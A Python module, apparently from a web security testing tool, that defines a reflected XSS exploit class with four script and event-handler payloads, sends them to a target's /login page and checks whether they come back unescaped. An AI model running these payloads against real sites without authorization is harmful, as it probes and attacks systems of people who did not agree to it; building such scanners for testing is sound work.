import requests
from .registry import Exploit, ExploitResult


class ReflectedXSS(Exploit):
    id = "xss_reflected"
    name = "Reflected XSS"
    category = "xss"
    description = "Injects script tags into reflected user input"
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "'\"><script>alert('XSS')</script>",
    ]
    
    def execute(self, target_url: str, payload_index: int = 0) -> ExploitResult:
        payload = self.get_payload(payload_index)
        try:
            resp = requests.get(f"{target_url}/login", params={"username": payload})
            return ExploitResult(
                success=self.check_success(resp),
                response={"html": resp.text},
                payload_used=payload,
            )
        except requests.RequestException as e:
            return ExploitResult(
                success=False,
                response={},
                payload_used=payload,
                error=str(e),
            )
    
    def check_success(self, response) -> bool:
        return "<script>" in response.text or "onerror=" in response.text or "onload=" in response.text
